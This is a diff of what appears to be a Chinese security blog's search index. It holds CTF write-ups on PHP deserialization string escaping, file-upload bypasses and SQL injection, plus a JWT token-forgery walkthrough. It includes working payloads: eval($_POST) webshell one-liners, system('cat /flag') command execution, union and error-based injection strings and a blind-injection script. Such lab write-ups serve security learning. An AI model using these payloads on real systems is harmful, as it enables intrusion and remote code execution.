+<p>那么序列化之后只会把这个值当作一个字符串看待，不会把它当作一个类，需要将这个值单独逃逸出来</p>
+<p>最终的payload可以是这样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样进行字符串减少后就成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;UserAccount&quot;:2:&#123;s:11:&quot; * username&quot;;s:45:&quot;a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就相当于给username赋值了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123</code>，给password赋值了一个类，而不是一个字符串，<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>被当作类来处理从而给f属性进行赋值，最后利用<code>eval</code>来得到flag</p>
+]]></content>
+  </entry>
+  <entry>
     <title>循环用法</title>
     <url>/2022/10/27/%E5%BE%AA%E7%8E%AF/</url>
     <content><![CDATA[<p>php循环的用法</p>
@@ -1627,49 +1681,27 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Typora用法</title>
-    <url>/2022/10/04/Typora%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>Typora基本用法</p>
+    <title>buu的upload</title>
+    <url>/2022/12/03/upload%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<p>[ACTF2020 新生赛]Upload	[GXYCTF2019]BabyUpload	[MRCTF2020]你传你🐎呢	[极客大挑战 2019]Upload</p>
 <span id="more"></span>
 
-<h6 id="1-标题快捷键是ctrl-数字"><a href="#1-标题快捷键是ctrl-数字" class="headerlink" title="1.标题快捷键是ctrl+数字"></a>1.标题快捷键是ctrl+数字</h6><h6 id="2-让字体居中显示"><a href="#2-让字体居中显示" class="headerlink" title="2.让字体居中显示"></a>2.让字体居中显示</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;居中&lt;/center&gt;</span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;</span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="3-修改字体颜色"><a href="#3-修改字体颜色" class="headerlink" title="3.修改字体颜色"></a>3.修改字体颜色</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=颜色代码 size=字号 face=&quot;字体名称&quot;&gt;文本&lt;/font&gt;</span><br></pre></td></tr></table></figure>
-
-<p>红色的代码是#ff0000</p>
-<h6 id="4-插入图片的语法是"><a href="#4-插入图片的语法是" class="headerlink" title="4.插入图片的语法是"></a>4.插入图片的语法是</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![](这里是图片所在的文件)</span><br></pre></td></tr></table></figure>
-
-<h6 id="5-设置链接是直接将链接写入"><a href="#5-设置链接是直接将链接写入" class="headerlink" title="5.设置链接是直接将链接写入"></a>5.设置链接是直接将链接写入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;www.baidu.com&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="6-常用快捷键"><a href="#6-常用快捷键" class="headerlink" title="6.常用快捷键"></a>6.常用快捷键</h6><p><img src="/2022/10/04/Typora%E7%94%A8%E6%B3%95/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>buu的SQL</title>
-    <url>/2022/12/03/SQL%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
-    <content><![CDATA[<p>[极客大挑战 2019]LoveSQL	[极客大挑战 2019]BabySQL	[极客大挑战 2019]HardSQL	[GXYCTF2019]BabySQli	[CISCN2019 华北赛区 Day2 Web1]Hack World</p>
-<span id="more"></span>
-
-<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>1.先使用万能密码1’ or 1&#x3D;1#进行尝试查看是否有回显，查看存在回显</p>
-<p>2.查看字段数，使用order by或者union select，因为是在http行进行的输入#注释无法使用，所以使用%23来进行注释</p>
-<p>3.经过试验有3个字段，然后进行联合注入即可</p>
-<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>1.经过试验存在union，select，or，注释符，and，from，where及其他过滤，但是可以使用%23进行注释，这里可以都是用双写绕过</p>
-<p>2.使用万能密码，存在回显</p>
-<p>3.使用联合注入check.php?username&#x3D;1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23&amp;password&#x3D;123来爆出所有的库</p>
-<p>4.选用ctf库，进行爆表名为flag，再爆字段也为flag</p>
-<p>5.最后爆数据</p>
-<h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>1.存在空格，union，and，&#x3D;，过滤</p>
-<p>2.使用报错型注入，注入时的语句不可以带有空格，使用check.php?username&#x3D;1&amp;password&#x3D;1’or(extractvalue(1,concat(0x7e,(select(database())))))%23来爆出数据库</p>
-<p>3.然后继续使用报错型注入来爆表，字段，</p>
-<p>4.获得数据时flag无法显示完全，使用left()和right()函数来获得全部数据，例如group_concat(right(password,32))</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left()和right()函数用法</span><br><span class="line">LEFT (input_string , number_of_characters)</span><br><span class="line">input_string可以是文字字符串，变量或列。</span><br><span class="line">number_of_characters是一个正整数，指定将返回input_string的字符数。</span><br></pre></td></tr></table></figure>
-
-<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>1.存在()过滤，使用union盲注</p>
-<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>1.该关是盲注，并且存在过滤，打开网页上已经提示flag在flag表的flag列</p>
-<p>2.输入1发现返回Hello, glzjin wants a girlfriend.输入2返回Do you want to be my girlfriend?</p>
-<p>3.利用1和2返回的值进行构造if(substr((select(flag)from(flag)),1,1)&#x3D;’’,1,2)如果正确就会返回输入1时的内容，不正确就会返回输入2时的内容</p>
-<p>4.然后写盲注脚本(有点小问题)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;:</span><br><span class="line">        url=&quot;http://473b566b-93a5-4ae6-b850-b77390a9dc6a.node4.buuoj.cn:81&quot;</span><br><span class="line">        sqls=&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;.format(i,j)</span><br><span class="line">        data=&#123;&quot;id&quot;:sqls&#125;</span><br><span class="line">        c = s.post(url,data=data)</span><br><span class="line">        if &#x27;Hello&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>1.只允许上传图片</p>
+<p>2.上传含有木马的.jpg文件然后使用burp抓包</p>
+<p>3.将.jpg修改为.php，放包然后无法访问</p>
+<p>4.再将.jpg修改为.phtml，然后放包可以用蚁剑连接(.phtml是 <strong>PHP 2 程序</strong>的标准文件扩展名)</p>
+<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>1.上传php后缀的文件，显示<strong>后缀名不能有ph！</strong>，这是对后缀名的限制</p>
+<p>2.上传其他类型的文件显示<strong>上传类型也太露骨了吧！</strong>，这是对<code>Content-Type</code>的限制，修改为<code>image/jpeg</code>即可绕过</p>
+<p>3.上传php木马显示<strong>诶，别蒙我啊，这标志明显还是php啊</strong>，这是对文件的内容做了检测，不能含有&lt;?，只要php版本&lt;7，可以使用<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;mochu7&#39;]);&lt;/script&gt;</code>绕过</p>
+<p>4.对于文件后缀限制这个上传.htaccess，但会显示<strong>上传类型也太露骨了吧！</strong>，修改<code>Content-Type</code>，顺利上传</p>
+<p>5.然后直接上传有木马的jpg文件，最后用蚁剑连接</p>
+<h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>和[GXYCTF2019]BabyUpload一样</p>
+<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>1.上传内容为<code>&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code>的php文件显示**Not image!**，那就修改Content-Type处为image&#x2F;jpeg</p>
+<p>2.修改以后继续上传回显NOT!php!意思应该是不能上传后缀为php文件，那就使用.phtml来代替.php</p>
+<p>3.上传.phtml文件后显示不能包含&lt;?，所以使用<code>&lt;script language=&quot;php&quot;&gt;  eval($_POST[&#39;a&#39;]); &lt;/script&gt;</code></p>
+<p>4.修改了Content-Type，又使用了phtml，又跳过了&lt;?的过滤，上传文件后又显示了<code>内容不全是图片</code>,使用图片头文件欺骗为<code>GIF89a</code>,使用<code>GIF89a</code></p>
+<p><code>&lt;script language=&quot;php&quot;&gt;  eval($_POST[&#39;a&#39;]); &lt;/script&gt;</code></p>
+<p>5.发现上传成功，使用hackbar在post处使用a&#x3D;system(‘cat &#x2F;flag’);获得flag</p>
 ]]></content>
   </entry>
   <entry>
@@ -1741,38 +1773,6 @@
 <p><strong>in_array() 检查数组中是否存在某个值，存在返回true 否则false</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;];</span><br><span class="line">if(in_array(&#x27;wo&#x27;,$h))&#123;</span><br><span class="line">    echo &quot;found&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出  found</span><br></pre></td></tr></table></figure>
 
-]]></content>
-  </entry>
-  <entry>
-    <title>My Vouchers Repo(BSidesTLV 2023 CTF)</title>
-    <url>/2023/07/04/%5BBSidesTLV%202023%20CTF%5DMy%20Vouchers%20Repo/</url>
-    <content><![CDATA[<p>My Vouchers Repo</p>
-<span id="more"></span>
-
-<meta name="referrer" content="no-referrer">
-
-<p>打开页面就是一个登录和注册界面</p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162249810.png" alt="image-20230628162249810"></p>
-<p>那就先注册一个，一个是home界面，还有一个是优惠卷界面</p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162320815.png" alt="image-20230628162320815"></p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162356398.png" alt="image-20230628162356398"></p>
-<p>根据题目给你信息，应该是要登录用户名为<code>john</code>的用户，然后在源代码处的<code>[main.eb04397cc22cdfc5.js](https://my-voucher-repo.ctf.bsidestlv.com/main.eb04397cc22cdfc5.js)</code>中看到</p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162544646.png" alt="image-20230628162544646"></p>
-<p>这样知道了是在header头<code>Authorization</code>处有用户登录信息，然后就是想办法伪造一个用户名是<code>john</code>的用户，这个是jwt，但是找不到密钥，还在源代码中找到一个api接口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/signin</span><br><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>
-
-<p>扫描目录发现还有一个<code>api/v1</code>接口，但是显示<code>not found</code>，接下来就不会做了，然后就看别人给的hint，发现api&#x2F;v1是可以打开的</p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628163909724.png" alt="image-20230628163909724"></p>
-<p>这个有一个<code>/refresh_token</code>，所以在url为一下界面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v1/refresh_token</span><br></pre></td></tr></table></figure>
-
-<p>使用json传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;john&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样可以回显一个用户名为john的token，然后在url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>
-
-<p>header头中的<code>Authorization</code>中输入<code>Bearer 用户名为john的token</code>就可以得到flag</p>
 ]]></content>
   </entry>
   <entry>
